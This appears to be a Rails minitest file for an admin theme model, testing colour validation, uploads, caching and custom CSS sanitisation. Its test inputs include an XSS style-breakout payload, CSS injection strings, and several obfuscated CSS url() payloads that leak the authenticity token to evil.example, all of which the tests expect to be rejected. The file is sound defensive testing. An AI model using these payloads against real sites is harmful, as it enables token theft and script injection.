require 'test_helper'
require 'minitest/mock'

class AdminThemeTest < ActiveSupport::TestCase
  setup do
    AdminTheme.delete_all
    Rails.cache.clear
  end

  test "valid with defaults" do
    theme = build(:admin_theme)
    assert theme.valid?
  end

  test "validates hex color format" do
    theme = build(:admin_theme, primary_color: "not-a-color")
    assert_not theme.valid?
    assert theme.errors[:primary_color].any?
  end

  test "validates all color fields are hex" do
    %i[primary_color secondary_color surface_color background_color text_color sidebar_color].each do |field|
      theme = build(:admin_theme, field => "invalid")
      assert_not theme.valid?, "#{field} should require hex format"
    end
  end

  test "validates color_mode inclusion" do
    theme = build(:admin_theme, color_mode: "rainbow")
    assert_not theme.valid?
    assert theme.errors[:color_mode].any?
  end

  test "validates border_radius format" do
    theme = build(:admin_theme, border_radius: "big")
    assert_not theme.valid?
    assert theme.errors[:border_radius].any?

    theme.border_radius = "12px"
    assert theme.valid?
  end

  test "validates font_family characters" do
    theme = build(:admin_theme, font_family: "Inter; } body { display:none")
    assert_not theme.valid?
    assert theme.errors[:font_family].any?
  end

  test "validates brand_name length" do
    theme = build(:admin_theme, brand_name: "a" * 101)
    assert_not theme.valid?
  end

  test "rejects dangerous custom_css" do
    theme = build(:admin_theme, custom_css: "</style><script>alert('xss')</script>")
    assert_not theme.valid?
    assert theme.errors[:custom_css].any?
  end

  test "allows safe custom_css" do
    theme = build(:admin_theme, custom_css: ".my-class { color: red; }")
    assert theme.valid?
  end

  test "rejects </style breakout regardless of case" do
    ["</STYLE><b>", "</Style ", "a { } </style"].each do |css|
      assert AdminTheme.unsafe_css?(css), "#{css.inspect} should be rejected"
    end
  end

  test "rejects @import" do
    ['@import "https://evil.example/x.css";', "@IMPORT url(/local.css);"].each do |css|
      theme = build(:admin_theme, custom_css: css)
      assert_not theme.valid?, "#{css.inspect} should be rejected"
      assert theme.errors[:custom_css].any?
    end
  end

  test "rejects external url() that could exfiltrate page data" do
    [
      'input[name="authenticity_token"][value^="a"] { background: url(https://evil.example/a); }',
      "a { background: url('//evil.example/a'); }",
      'a { background: URL( "http://evil.example/a" ); }',
      "a { background: url(javascript:alert(1)); }",
      "a { background: url(data:text/html,hi); }",
      "a { background: url(https://evil.example/a",
      'a { background: u\72l(https://evil.example/a); }',
      'a { background: image-set("https://evil.example/a" 1x); }'
    ].each do |css|
      theme = build(:admin_theme, custom_css: css)
      assert_not theme.valid?, "#{css.inspect} should be rejected"
    end
  end

  test "allows relative and data: image urls and quoted strings" do
    [
      "a { background: url(/images/bg.png); }",
      "a { background: url('assets/bg.png'); }",
      'a { background: url("data:image/png;base64,iVBORw0KGgo="); }',
      '.x::after { content: "quoted"; font-family: "DM Sans"; }'
    ].each do |css|
      theme = build(:admin_theme, custom_css: css)
      assert theme.valid?, "#{css.inspect} should be allowed: #{theme.errors.full_messages}"
    end
  end

  test "logo validation rejects svg" do
    theme = build(:admin_theme)
    theme.logo.attach(io: StringIO.new("<svg/>"), filename: "logo.svg", content_type: "image/svg+xml")
    assert_not theme.valid?
    assert theme.errors[:logo].any?
  end

  test ".current falls back to unsaved defaults when the table is missing" do
    AdminTheme.stub(:table_exists?, false) do
      theme = AdminTheme.current
      assert_not theme.persisted?
      assert_equal 'Admin', theme.brand_name
      assert_equal '#6366f1', theme.primary_color
      assert_not theme.logo.attached?
      assert_not theme.favicon.attached?
    end
    assert_equal 0, AdminTheme.count
  end

  test ".current returns singleton with defaults" do
    theme = AdminTheme.current
    assert_equal '#6366f1', theme.primary_color
    assert_equal 'Admin', theme.brand_name
    assert theme.persisted?
  end

  test ".current caches the result" do
    AdminTheme.current
    assert_equal 1, AdminTheme.count
    AdminTheme.current
    assert_equal 1, AdminTheme.count
  end

  test ".bust_cache! clears the cached theme" do
    AdminTheme.current
    AdminTheme.bust_cache!
    theme = AdminTheme.current
    assert theme.persisted?
  end

  test "singleton_guard prevents duplicate records" do
    create(:admin_theme)
    duplicate = build(:admin_theme)
    assert_raises(ActiveRecord::RecordNotUnique) { duplicate.save!(validate: false) }
  end

  test "logo validation rejects non-image" do
    theme = build(:admin_theme)
    theme.logo.attach(io: StringIO.new("not-an-image"), filename: "file.pdf", content_type: "application/pdf")
    assert_not theme.valid?
    assert theme.errors[:logo].any?
  end

  test "favicon validation rejects oversized file" do
    theme = build(:admin_theme)
    theme.favicon.attach(io: StringIO.new("x" * 600.kilobytes), filename: "big.png", content_type: "image/png")
    assert_not theme.valid?
    assert theme.errors[:favicon].any?
  end
end
